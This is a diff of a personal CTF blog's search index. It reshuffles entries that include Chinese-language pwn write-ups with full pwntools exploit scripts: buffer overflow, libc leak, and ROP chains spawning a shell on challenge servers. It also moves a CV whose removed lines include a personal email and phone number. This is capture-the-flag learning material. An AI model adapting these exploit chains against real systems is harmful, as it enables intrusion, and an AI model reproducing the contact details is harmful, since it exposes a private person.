-<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#115;&#116;&#100;&#111;&#x75;&#x74;&#64;&#71;&#76;&#x49;&#66;&#67;&#x5f;&#x32;&#46;&#x32;&#x2e;&#x35;" >&#115;&#116;&#100;&#111;&#x75;&#x74;&#64;&#71;&#76;&#x49;&#66;&#67;&#x5f;&#x32;&#46;&#x32;&#x2e;&#x35;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
+<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#115;&#x74;&#100;&#x6f;&#x75;&#116;&#64;&#71;&#76;&#73;&#66;&#67;&#95;&#50;&#46;&#x32;&#46;&#x35;" >&#115;&#x74;&#100;&#x6f;&#x75;&#116;&#64;&#71;&#76;&#73;&#66;&#67;&#95;&#50;&#46;&#x32;&#46;&#x35;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
 </blockquote>
 <p><img  
                      lazyload
@@ -932,19 +932,6 @@
 </ul>
 <hr>
 <h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">r= remote(<span class="string">&#x27;140.116.246.190&#x27;</span>,<span class="number">8789</span>)</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf 在設定rdi時 是用 mov rdi, rax</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">detmclone = <span class="number">0x4010d0</span> <span class="comment"># 會把rax設成 stdout</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x4011c5</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    bss,</span><br><span class="line">    ret,</span><br><span class="line">    detmclone,</span><br><span class="line">    mov_rdi_rax</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;2024?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;stdout -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.symbols[<span class="string">&#x27;stdout&#x27;</span>]))</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x21A780</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line">pop_rdi = l.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = l.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rax = l.address + <span class="number">0x45eb0</span></span><br><span class="line">pop_rdx_rbx = l.address + <span class="number">0x90529</span></span><br><span class="line">syscall = l.address + <span class="number">0x29db4</span></span><br><span class="line">sh = l.address + <span class="number">0x1D8698</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;sh: %s&quot;</span> % <span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sh,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    ret,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <categories>
-        <category>PWN</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NCKUCTF ret2libc_adv WriteUp</title>
-    <url>/2024/08/11/ncku/</url>
-    <content><![CDATA[<h2 id="ret2libc-adv"><a href="#ret2libc-adv" class="headerlink" title="ret2libc_adv"></a>ret2libc_adv</h2><p><code>b&#39;a&#39;*0x28</code> overflow 後，把 leak 的chain 寫入，然後寫回main後使用libc中的東西<br>這題因為 <a href="https://chihhhs.github.io/2024/08/05/pwn-1/#Lazy-Binding">lazy bindding</a> 所以我們不能使用<code>printf</code>它來leak base address</p>
-<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">l = ELF(<span class="string">&quot;/root/pwn/ctf/libc.so.6&quot;</span>)</span><br><span class="line">r= remote(<span class="string">&#x27;chall.nckuctf.org&#x27;</span>, <span class="number">10010</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow with 0x28</span></span><br><span class="line">pop_rdi = <span class="number">0x401463</span></span><br><span class="line">print_got = <span class="number">0x404018</span></span><br><span class="line">puts_plt = <span class="number">0x4010a0</span></span><br><span class="line">main = <span class="number">0x4011f6</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">leave_ret = <span class="number">0x4013f1</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    ret,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    print_got,</span><br><span class="line">    puts_plt,</span><br><span class="line">    ret,</span><br><span class="line">    main</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Exit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;go!\n&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x80e50</span></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>))))</span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span>, pop_rdi, <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>)), ret, l.sym.system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Exit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;go!\n&#x27;</span>,p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -1069,6 +1056,19 @@
 <li>overflow to the address of shellcode</li>
 </ol>
 <h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cd</span> prectice</span><br><span class="line"><span class="variable">$docker</span> compose up -d</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>PWN</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NCKUCTF ret2libc_adv WriteUp</title>
+    <url>/2024/08/11/ncku/</url>
+    <content><![CDATA[<h2 id="ret2libc-adv"><a href="#ret2libc-adv" class="headerlink" title="ret2libc_adv"></a>ret2libc_adv</h2><p><code>b&#39;a&#39;*0x28</code> overflow 後，把 leak 的chain 寫入，然後寫回main後使用libc中的東西<br>這題因為 <a href="https://chihhhs.github.io/2024/08/05/pwn-1/#Lazy-Binding">lazy bindding</a> 所以我們不能使用<code>printf</code>它來leak base address</p>
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">l = ELF(<span class="string">&quot;/root/pwn/ctf/libc.so.6&quot;</span>)</span><br><span class="line">r= remote(<span class="string">&#x27;chall.nckuctf.org&#x27;</span>, <span class="number">10010</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow with 0x28</span></span><br><span class="line">pop_rdi = <span class="number">0x401463</span></span><br><span class="line">print_got = <span class="number">0x404018</span></span><br><span class="line">puts_plt = <span class="number">0x4010a0</span></span><br><span class="line">main = <span class="number">0x4011f6</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">leave_ret = <span class="number">0x4013f1</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    ret,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    print_got,</span><br><span class="line">    puts_plt,</span><br><span class="line">    ret,</span><br><span class="line">    main</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Exit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;go!\n&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x80e50</span></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>))))</span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span>, pop_rdi, <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>)), ret, l.sym.system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Exit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;go!\n&#x27;</span>,p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -2951,6 +2951,82 @@ Pwnable.tw</p>
       </tags>
   </entry>
   <entry>
+    <title>林詠智 (Yung-Chih, Lin)</title>
+    <url>/CV/index.html</url>
+    <content><![CDATA[<p><a href="https://chihhhs.github.io/">Personal Blog</a></p>
+<h2 id="Education"><a href="#Education" class="headerlink" title="Education"></a>Education</h2><p>Bachelor, Computer Science and Infomation Engineering, 2022 - 2026 (expected)</p>
+<ul>
+<li>National Taitung University (NTTU)</li>
+</ul>
+<h3 id="Core-Coursework"><a href="#Core-Coursework" class="headerlink" title="Core Coursework"></a>Core Coursework</h3><ul>
+<li>Workstation Setup, Base on RHCSA Certificate</li>
+<li>Server Management, Base on RHCE Certificate</li>
+<li>Cyber Security</li>
+<li>Machine Learning</li>
+<li>Data Structure</li>
+<li>Algorithm</li>
+</ul>
+<h2 id="Professional-Roles"><a href="#Professional-Roles" class="headerlink" title="Professional Roles"></a>Professional Roles</h2><ul>
+<li>臺東大學 資訊安全研究社 總務 (2023 - 2025)</li>
+<li>臺東大學 衝浪社 社長 (2023 - 2025)</li>
+<li>成功大學 資安社 B33F50UP 戰隊成員 (2024 -)</li>
+<li>臺東大學 駭客攻防課程 研究獎助生 (2024&#x2F;2 - 2024&#x2F;6)</li>
+<li>臺東大學 網路安全實務與社會實踐 課程助教</li>
+</ul>
+<h3 id="Lecturing-Experience"><a href="#Lecturing-Experience" class="headerlink" title="Lecturing Experience"></a>Lecturing Experience</h3><ul>
+<li>2024  國立臺東大學資訊安全研究社 (PWN-Basic)</li>
+<li>2023  國立臺東大學資訊安全研究社 (Reversing by GDB)</li>
+</ul>
+<h2 id="Specialized-Training"><a href="#Specialized-Training" class="headerlink" title="Specialized Training"></a>Specialized Training</h2><ul>
+<li>2023 AIS3 東區資安體驗營PWN 記憶體溢位</li>
+<li><strong>2024 AIS3 新型態資安實務主題課程</strong></li>
+<li><strong>台灣好厲駭 第九屆學員</strong></li>
+</ul>
+<ul>
+<li>CTF PWN<ul>
+<li><a href="https://chihhhs.github.io/tags/pwn/">Blog WriteUp</a></li>
+</ul>
+</li>
+<li>2024 共學小組 Mitre ATT&amp;CK LLM應用<ul>
+<li><a href="https://chihhhs.github.io/2024/11/26/RAG/">Blog Post</a></li>
+</ul>
+</li>
+<li>2024 沙崙資安新秀媒合培育計畫 <ul>
+<li><a href="https://chihhhs.github.io/2024/11/28/acwSouth/">Blog Post</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="Competitive-Achievements"><a href="#Competitive-Achievements" class="headerlink" title="Competitive Achievements"></a>Competitive Achievements</h2><ul>
+<li>2024 Hitcon CyberRange 學生場</li>
+<li><strong>2025 AIS3 EOF 淺力獎, 4th</strong></li>
+</ul>
+<h2 id="Technical-Projects"><a href="#Technical-Projects" class="headerlink" title="Technical Projects"></a>Technical Projects</h2><ul>
+<li><strong>IDS_MoE</strong> - IDS base on Mixture of Experts</li>
+<li><strong>TRL_Trainer</strong> - LLM Finetune tool <a class="link"   href="https://github.com/Chihhhs/TRL_Trainer" >Github.<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><strong>Assistant_for_ATT-CK</strong>  - LLM Application Base on Mitre ATT&amp;CK <a class="link"   href="https://github.com/Chihhhs/Assistant_for_ATT-CK" >Github.<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<h3 id="Skills"><a href="#Skills" class="headerlink" title="Skills"></a>Skills</h3><ul>
+<li>Software Dev: Git, Python, C++<ol>
+<li>Frontend: Html, CSS, Javascript</li>
+<li>Backend: Flask, Docker, K8s</li>
+</ol>
+</li>
+<li>CyberSecurity:  Kali Linux<ol>
+<li>CTF: Reversing, Pwnings</li>
+<li>IDS: Suricata, Yara</li>
+</ol>
+</li>
+<li>ML&#x2F;AI: PyTorch, scikit-learn</li>
+<li>LLM: LangChain, Hugging Face, Ollama</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>categories</title>
+    <url>/categories/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>About</title>
     <url>/about/index.html</url>
     <content><![CDATA[<h1 align="center">
@@ -3029,86 +3105,8 @@ Pwnable.tw</p>
 </div>]]></content>
   </entry>
   <entry>
-    <title>CV</title>
-    <url>/CV/index.html</url>
-    <content><![CDATA[<h1 id="林詠智-Yung-Chih-Lin"><a href="#林詠智-Yung-Chih-Lin" class="headerlink" title="林詠智 (Yung-Chih, Lin)"></a>林詠智 (Yung-Chih, Lin)</h1><p><a href="https://chihhhs.github.io/">Personal Blog</a></p>
-<h2 id="Education"><a href="#Education" class="headerlink" title="Education"></a>Education</h2><p>Bachelor, Computer Science and Infomation Engineering, 2022 - 2026 (expected)</p>
-<ul>
-<li>National Taitung University (NTTU)</li>
-</ul>
-<h3 id="Core-Coursework"><a href="#Core-Coursework" class="headerlink" title="Core Coursework"></a>Core Coursework</h3><ul>
-<li>Workstation Setup, Base on RHCSA Certificate</li>
-<li>Server Management, Base on RHCE Certificate</li>
-<li>Cyber Security</li>
-<li>Machine Learning</li>
-<li>Data Structure</li>
-<li>Algorithm</li>
-</ul>
-<h2 id="Professional-Roles"><a href="#Professional-Roles" class="headerlink" title="Professional Roles"></a>Professional Roles</h2><ul>
-<li>臺東大學 資訊安全研究社 總務 (2023 - 2025)</li>
-<li>臺東大學 衝浪社 社長 (2023 - 2025)</li>
-<li>成功大學 資安社 B33F50UP 戰隊成員 (2024 -)</li>
-<li>臺東大學 駭客攻防課程 研究獎助生 (2024&#x2F;2 - 2024&#x2F;6)</li>
-<li>臺東大學 網路安全實務與社會實踐 課程助教</li>
-</ul>
-<h3 id="Lecturing-Experience"><a href="#Lecturing-Experience" class="headerlink" title="Lecturing Experience"></a>Lecturing Experience</h3><ul>
-<li>2024  國立臺東大學資訊安全研究社 (PWN-Basic)</li>
-<li>2023  國立臺東大學資訊安全研究社 (Reversing by GDB)</li>
-</ul>
-<h2 id="Specialized-Training"><a href="#Specialized-Training" class="headerlink" title="Specialized Training"></a>Specialized Training</h2><ul>
-<li>2023 AIS3 東區資安體驗營PWN 記憶體溢位</li>
-<li><strong>2024 AIS3 新型態資安實務主題課程</strong></li>
-<li><strong>台灣好厲駭 第九屆學員</strong></li>
-</ul>
-<ul>
-<li>CTF PWN<ul>
-<li><a href="https://chihhhs.github.io/tags/pwn/">Blog WriteUp</a></li>
-</ul>
-</li>
-<li>2024 共學小組 Mitre ATT&amp;CK LLM應用<ul>
-<li><a href="https://chihhhs.github.io/2024/11/26/RAG/">Blog Post</a></li>
-</ul>
-</li>
-<li>2024 沙崙資安新秀媒合培育計畫 <ul>
-<li><a href="https://chihhhs.github.io/2024/11/28/acwSouth/">Blog Post</a></li>
-</ul>
-</li>
-</ul>
-<h2 id="Competitive-Achievements"><a href="#Competitive-Achievements" class="headerlink" title="Competitive Achievements"></a>Competitive Achievements</h2><ul>
-<li>2024 Hitcon CyberRange 學生場</li>
-<li><strong>2025 AIS3 EOF 淺力獎, 4th</strong></li>
-</ul>
-<h2 id="Technical-Projects"><a href="#Technical-Projects" class="headerlink" title="Technical Projects"></a>Technical Projects</h2><ul>
-<li><strong>IDS_MoE</strong> - IDS base on Mixture of Experts</li>
-<li><strong>TRL_Trainer</strong> - LLM Finetune tool <a class="link"   href="https://github.com/Chihhhs/TRL_Trainer" >Github.<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><strong>Assistant_for_ATT-CK</strong>  - LLM Application Base on Mitre ATT&amp;CK <a class="link"   href="https://github.com/Chihhhs/Assistant_for_ATT-CK" >Github.<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<h3 id="Skills"><a href="#Skills" class="headerlink" title="Skills"></a>Skills</h3><ul>
-<li>Software Dev: Git, Python, C++<ol>
-<li>Frontend: Html, CSS, Javascript</li>
-<li>Backend: Flask, Docker, K8s</li>
-</ol>
-</li>
-<li>CyberSecurity:  Kali Linux<ol>
-<li>CTF: Reversing, Pwnings</li>
-<li>IDS: Suricata, Yara</li>
-</ol>
-</li>
-<li>ML&#x2F;AI: PyTorch, scikit-learn</li>
-<li>LLM: LangChain, Hugging Face, Ollama</li>
-</ul>
-<hr>
-<p><a class="link"   href="mailto:&#x63;&#x68;&#105;&#x68;&#49;&#48;&#x35;&#x30;&#49;&#53;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;" >&#x63;&#x68;&#105;&#x68;&#49;&#48;&#x35;&#x30;&#49;&#53;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> • +886 (0)966 763 145</p>
-]]></content>
-  </entry>
-  <entry>
     <title>tags</title>
     <url>/tags/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>categories</title>
-    <url>/categories/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
 </search>
